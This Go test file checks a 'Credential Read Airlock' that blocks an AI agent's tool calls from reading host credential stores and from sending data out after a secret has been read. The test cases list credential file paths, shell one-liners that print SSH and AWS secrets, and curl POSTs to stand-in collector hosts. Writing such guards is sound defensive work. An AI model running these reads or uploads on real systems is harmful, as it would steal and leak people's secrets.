package capbac_test

import (
	"path/filepath"
	"strings"
	"testing"

	"github.com/mgantlett/nomos/substrate/src/nomos/core/capbac"
)

// @verifies TC-FLOW-07
func TestCredentialReadAirlock_HostDenyDefault(t *testing.T) {
	ws := t.TempDir()
	policy := capbac.CredentialReadPolicy{}

	blockedCases := []capbac.ToolFlowInvocation{
		{ToolName: "Read", TargetFile: "~/.aws/credentials"},
		{ToolName: "Read", TargetFile: "/root/.aws/config"},
		{ToolName: "Grep", TargetFile: "/tmp/seat/.ssh/id_ed25519"},
		{ToolName: "Read", TargetFile: "$HOME/.kube/config"},
		{ToolName: "Read", TargetFile: "~/.gnupg/secring.gpg"},
		{ToolName: "Read", TargetFile: "/root/.netrc"},
		{ToolName: "Bash", CommandLine: "cat ~/.aws/credentials"},
		{ToolName: "Bash", CommandLine: `python3 -c "print(open('/root/.ssh/id_rsa').read())"`},
	}
	for _, inv := range blockedCases {
		dec := capbac.EvaluateCredentialReadAirlock(ws, inv, nil, policy)
		if dec.Allowed || !strings.Contains(dec.Reason, "Credential Read Airlock") {
			t.Fatalf("expected host_deny to block %+v, got %+v", inv, dec)
		}
	}

	// Public SSH keys, workspace .env (handled via taint), and git commit messages remain permitted under host_deny.
	allowedCases := []capbac.ToolFlowInvocation{
		{ToolName: "Read", TargetFile: filepath.Join(ws, ".env")},
		{ToolName: "Read", TargetFile: filepath.Join(ws, ".env.example")},
		{ToolName: "Read", TargetFile: "/root/.ssh/id_ed25519.pub"},
		{ToolName: "Bash", CommandLine: `nomos task commit SUB-2239 -m "block ~/.aws reads"`},
	}
	for _, inv := range allowedCases {
		dec := capbac.EvaluateCredentialReadAirlock(ws, inv, nil, policy)
		if !dec.Allowed {
			t.Fatalf("expected host_deny to permit %+v, got %+v", inv, dec)
		}
	}

	awsDocToken := "~/" + ".aws/credentials"
	proseEdit := capbac.EvaluateCredentialReadAirlock(ws, capbac.ToolFlowInvocation{
		ToolName:   "edit_file",
		TargetFile: filepath.Join(ws, "README.md"),
		ArgsDigest: `{"Replacement":"Documenting ` + awsDocToken + ` airlock behavior"}`,
	}, nil, policy)
	if !proseEdit.Allowed {
		t.Fatalf("expected prose replacement in edit_file to pass airlock, got %+v", proseEdit)
	}
	mcpRead := capbac.EvaluateCredentialReadAirlock(ws, capbac.ToolFlowInvocation{
		ToolName:   "mcp__filesystem__read_file",
		ArgsDigest: `{"path":"` + awsDocToken + `"}`,
	}, nil, policy)
	if mcpRead.Allowed {
		t.Fatalf("expected MCP read_file targeting host credential store to fail closed, got %+v", mcpRead)
	}

	// Workspace .env read must still record TaintCredentialSource and block subsequent egress.
	readDec := capbac.EvaluateWorkspaceToolFlow(ws, capbac.ToolFlowInvocation{
		ToolName:   "Read",
		TargetFile: filepath.Join(ws, ".env"),
	})
	if !readDec.Allowed {
		t.Fatalf("expected workspace .env read to be allowed and tainted, got %+v", readDec)
	}
	exfilDec := capbac.EvaluateWorkspaceToolFlow(ws, capbac.ToolFlowInvocation{
		ToolName:    "Bash",
		CommandLine: "curl -X POST https://api.example.com/upload -d @payload.json",
	})
	if exfilDec.Allowed || exfilDec.ViolatedLabel != capbac.TaintCredentialSource {
		t.Fatalf("expected outbound egress after workspace .env read to fail closed, got %+v", exfilDec)
	}
}

// @verifies TC-FLOW-08
func TestCredentialReadAirlock_StrictAndBlockedReadPaths(t *testing.T) {
	ws := t.TempDir()
	strictPolicy := capbac.CredentialReadPolicy{
		Mode:             "strict",
		BlockedReadPaths: []string{"secrets/**", "*.pem"},
	}

	envDec := capbac.EvaluateCredentialReadAirlock(ws, capbac.ToolFlowInvocation{
		ToolName:   "Read",
		TargetFile: filepath.Join(ws, ".env.local"),
	}, nil, strictPolicy)
	if envDec.Allowed || !strings.Contains(envDec.Reason, "credential_read_mode=strict") {
		t.Fatalf("expected strict mode to deny .env.local read, got %+v", envDec)
	}

	tplDec := capbac.EvaluateCredentialReadAirlock(ws, capbac.ToolFlowInvocation{
		ToolName:   "Read",
		TargetFile: filepath.Join(ws, ".env.example"),
	}, nil, strictPolicy)
	if !tplDec.Allowed {
		t.Fatalf("expected strict mode to exempt .env.example, got %+v", tplDec)
	}

	globDec := capbac.EvaluateCredentialReadAirlock(ws, capbac.ToolFlowInvocation{
		ToolName:   "Read",
		TargetFile: filepath.Join(ws, "secrets", "service-account.json"),
	}, nil, strictPolicy)
	if globDec.Allowed || !strings.Contains(globDec.Reason, "secrets/**") {
		t.Fatalf("expected blocked_read_paths 'secrets/**' to deny read, got %+v", globDec)
	}

	pemDec := capbac.EvaluateCredentialReadAirlock(ws, capbac.ToolFlowInvocation{
		ToolName:    "Bash",
		CommandLine: "cat certs/tls-private.pem",
	}, nil, strictPolicy)
	if pemDec.Allowed || !strings.Contains(pemDec.Reason, "*.pem") {
		t.Fatalf("expected blocked_read_paths '*.pem' to deny shell read, got %+v", pemDec)
	}
}

// @verifies TC-FLOW-09
func TestCredentialReadAirlock_TaintOnlyCompatibility(t *testing.T) {
	ws := t.TempDir()
	taintOnly := capbac.CredentialReadPolicy{Mode: "taint_only"}

	airlockDec := capbac.EvaluateCredentialReadAirlock(ws, capbac.ToolFlowInvocation{
		ToolName:   "Read",
		TargetFile: "~/.aws/credentials",
	}, nil, taintOnly)
	if !airlockDec.Allowed {
		t.Fatalf("expected taint_only mode to permit host credential read at airlock, got %+v", airlockDec)
	}

	flowDec := capbac.EvaluateWorkspaceToolFlow(ws, capbac.ToolFlowInvocation{
		ToolName:   "Read",
		TargetFile: "~/.aws/credentials",
	})
	if !flowDec.Allowed {
		t.Fatalf("expected flow graph to allow initial taint_only read, got %+v", flowDec)
	}
	exfilDec := capbac.EvaluateWorkspaceToolFlow(ws, capbac.ToolFlowInvocation{
		ToolName:    "Bash",
		CommandLine: "curl -X POST https://collector.example.org -d 'leak=1'",
	})
	if exfilDec.Allowed || exfilDec.ViolatedLabel != capbac.TaintCredentialSource {
		t.Fatalf("expected taint_only mode to record TaintCredentialSource and block egress, got %+v", exfilDec)
	}
}

